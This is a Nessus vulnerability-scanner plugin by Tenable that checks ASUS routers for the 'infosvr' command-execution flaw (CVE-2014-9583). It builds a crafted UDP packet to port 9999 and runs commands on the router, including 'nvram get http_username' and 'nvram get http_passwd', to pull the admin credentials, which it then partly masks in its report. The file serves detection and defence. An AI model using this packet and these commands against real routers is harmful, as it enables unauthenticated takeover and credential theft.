#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(80518);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/05/19 17:45:32 $");

  script_cve_id("CVE-2014-9583");
  script_bugtraq_id(71889);
  script_osvdb_id(116691);
  script_xref(name:"EDB-ID", value:"35688");

  script_name(english:"ASUS Router 'infosvr' Remote Command Execution");
  script_summary(english:"Attempts to exploit the ASUS Router 'infosvr' service backdoor.");

  script_set_attribute(attribute:"synopsis", value:"The remote device contains a backdoor.");
  script_set_attribute(attribute:"description", value:
"The remote device is an ASUS router that contains firmware which is
affected by a flaw in its 'infosvr' service due to not properly
checking the MAC address of a request. An unauthenticated, remote
attacker, using a crafted request to UDP port 9999, can exploit this
to run arbitrary commands or access configuration details (including
passwords) on the device.");
  # http://packetstormsecurity.com/files/129815/ASUSWRT-3.0.0.4.376_1071-LAN-Backdoor-Command-Execution.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?190a14cc");
  script_set_attribute(attribute:"see_also", value:"http://event.asus.com/2013/nw/ASUSWRT/");
  script_set_attribute(attribute:"see_also", value:"https://github.com/jduck/asus-cmd");
  script_set_attribute(attribute:"solution", value:"Contact the device vendor regarding the availability of an update.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/01/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/01/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:asus:rt-ac66u_firmware");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:asus:rt-n66u_firmware");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Backdoors");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_require_udp_ports(9999);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("raw.inc");

port = 9999;

if (islocalhost()) exit(0, "This plugin can not be run against the localhost.");
if (!islocalnet()) exit(0, "The remote host is more than one hop away.");

if (known_service(port:port, ipproto:"udp")) audit(AUDIT_SVC_ALREADY_KNOWN, port);
if (!get_udp_port_state(port)) audit(AUDIT_PORT_CLOSED, port, "udp");

set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);

function run_command(udp_socket, command, timeout)
{
  local_var packet, ll, bpf, output, res, pkt, data, out_len;

  output = NULL;

  packet =
    mkbyte(0x0C) +
    mkbyte(0x15) +
    mkword(0x0033) +
    mkdword(rand()) +
    mkpad(38) +
    mkword(strlen(command)) +
    command;

  packet = packet + mkpad(512 - strlen(packet));

  ll = link_layer();
  if (isnull(ll)) exit(1, "Could not find the link layer we are operating on.");

  bpf = bpf_open("udp and src port 9999 and dst port 9999 and dst host 255.255.255.255");
  if (isnull(bpf)) exit(1, "Could not obtain a bpf.");

  send(socket:udp_socket, data:packet);

  res = bpf_next(bpf:bpf, timeout:timeout);
  if (!isnull(res))
  {
    res = substr(res, strlen(ll), strlen(res) - 1);
    if (!isnull(res))
    {
      pkt = packet_split(res);
      if (!isnull(pkt) && !isnull(pkt[2]) &&!isnull(pkt[2]['data']))
      {
        data = pkt[2]['data'];
        if (strlen(data) >= 16)
        {
          out_len = getword(blob:data, pos:14);
          if (out_len > 0)
          {
            output = chomp(substr(data, 16, 15 + out_len));
          }
        }
      }
    }
  }

  bpf_close(bpf);

  return output;
}

s = open_sock_udp(port);
if (!s) audit(AUDIT_SOCK_FAIL, port, "udp");

timeout = get_read_timeout() * 1000;

wps_mfstring = run_command(udp_socket:s, command:"nvram get wps_mfstring", timeout:timeout);

if ("ASUS" >!< wps_mfstring) audit(AUDIT_NOT_LISTEN, "The ASUSWRT 'infosvr' service", port, "udp");

user = run_command(udp_socket:s, command:"nvram get http_username", timeout:timeout);
pass = run_command(udp_socket:s, command:"nvram get http_passwd", timeout:timeout);

# mask the actual password except the first and last character
if (!isnull(pass) && strlen(pass) >= 2)
  pass = pass[0] + crap(data:'*', length:6) + pass[strlen(pass)-1];

register_service(port:port, ipproto:"udp", proto:"asuswrt_infosvr");

if (report_verbosity > 0 && !isnull(user) && !isnull(pass))
{
  report =
    '\nNessus was able to exploit the vulnerability to gather the HTTP' +
    '\ncredentials of the ASUS router:' +
    '\n' +
    '\n  Username : ' + user +
    '\n  Password : ' + pass +
    '\n' +
    '\nNote that the password displayed here has been partially obfuscated.' +
    '\n';

  security_hole(port:port, proto:"udp", extra:report);
}
else security_hole(port:port, proto:"udp");
